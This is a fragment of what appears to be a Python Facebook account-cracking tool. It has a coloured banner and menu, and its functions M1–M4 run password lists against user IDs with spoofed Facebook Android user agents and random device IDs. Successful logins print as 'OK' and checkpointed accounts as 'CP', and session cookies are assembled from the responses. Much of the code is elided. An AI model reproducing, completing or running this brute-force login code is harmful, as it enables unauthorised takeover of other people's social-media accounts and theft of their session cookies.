...
\033[1;32m d888888b d8b   db d88888b d888888b d8b \033[1;32m  db 
 ...
 \033[1;31m   88    88V8o 88 88ooo      88    88V8o 88 
\033[1;31m    88    88 V8o88 88===      88    88 V\033[1;31m8o88 
...
\033[1;32m[\033[1;31m=\033[1;32m] \033[1;32mVERSION \033[1;37m: 1.1
\033[1;32m══════════════════════════════════════""")
def linex():
    print('\033[1;32m══════════════════════════════════════')
def clear():
...
def menu():
                        ...
                        print('\033[1;37m[\033[1;31m4\033[1;37m] \033[1;32mYOUTUBE ')
                        ...
                        if xd in ['1','01']:
                                ...
                                print('\033[1;37m[\033[1;32m=\033[1;31m] \033[1;34mTotal OK/CP: \033[1;32m'+str(len(oks))+'/'+str(len(cps)))
                                linex()
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[INF-M1]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;31m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m<[INF-OK]> '+ids+' ✅ '+pas+'\033[1;32m')
                                        #------[OK IDS]------#
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m<[INF-CP]> '+ids+' ☒ '+pas+'\033[1;31m')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[INF-M2]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/;FBAV/4Q095MQG;FBBV/630615857;FBAN/FBAN;FBAV/4Q095MQG;FBBV/630615857;FBDM//*{density=3.0,width=1440,height=2560};FBLC/fr_FR;FBRV/116753598;FBCR/Nokia;FBMF/OnePlus;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/HTC_U11;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/18;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<[INF-OK]> '+ids+' ✅ '+pas+' | '+joined(uid)+'\033[1;32m')
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[INF-M3]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<[INF-M4]>×<[%s| \033[1;32mOK\033[1;37m|\033[1;31mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FB4A/;FBAV/A1XDL5U4;FBBV/439205076;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/439205076;FBDM//*{density=1.5,width=1920,height=1920};FBLC/es_ES;FBRV/521757511;FBCR/TECNO;FBMF/OnePlus;FBBD/Honor;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5_IV;FBSV/11;FBOP/7;FBCA/armeabi-v7a;FBSS/;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
